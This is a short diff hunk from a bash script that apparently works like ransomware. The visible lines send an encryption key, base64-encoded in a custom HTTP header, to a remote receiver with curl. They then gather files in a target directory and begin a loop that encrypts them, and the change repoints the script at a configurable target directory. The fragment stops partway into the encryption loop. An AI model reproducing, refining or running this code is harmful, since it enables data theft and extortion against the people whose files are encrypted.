@@ -171,14 +171,12 @@ echo -e "\t =KEY: $key"
 # Using the very RFC-conforming "Special-Delivery" header
 curl -X POST -H "Special-Delivery: $(printf "%s" "$key" | base64)" "$RECEIVER" 2>/dev/null
 
-# Ensure the script is run from a location where rx_dir is created, or provide a full path.
-# Example: find_files "$(pwd)/rx_dir" "exposed_files"
-find_files "rx_dir" "exposed_files"
+# Target dir assumed to be in same directory
+find_files "$(pwd)/$TARGET_DIR" "exposed_files"
 
 # So far - we found all files via find_files(), which calls check_file()
 # We now loop over that and encryptthe files. We only need to transfer
 # the single secret; the other inputs to SHA256 (file ownership, path) are less like to change
-
 echo "---------ENCRYPTING---------"
 echo ":"
 for file in "${exposed_files[@]}"; do
